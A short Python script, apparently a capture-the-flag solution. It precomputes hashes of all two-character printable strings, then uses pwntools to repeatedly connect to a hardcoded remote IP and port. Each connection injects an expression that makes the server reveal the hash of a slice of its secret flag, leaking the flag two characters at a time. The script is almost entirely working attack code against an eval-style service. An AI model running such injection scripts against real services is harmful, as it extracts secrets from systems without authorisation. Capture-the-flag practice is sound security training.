import string
import time

rainbow = {}

for a in string.printable:
    for b in string.printable:
        s = ""
        s += a; s += b
        # print(f'{type(s)} {s}')
        rainbow[hash(s)] = s
        # time.sleep(0.00001)

# for color in rainbow:
    # print(color, rainbow[color])

from pwn import *

for i in range(0,920):
    c = remote('108.137.70.166', 14000)
    s = f'hash(flag[{i}:{i}+2])'
    c.sendline(s.encode('utf-8'))
    print(f'flag[{i}:{i}+2] = {c.recvall()[3:-1]}')
    c.close()
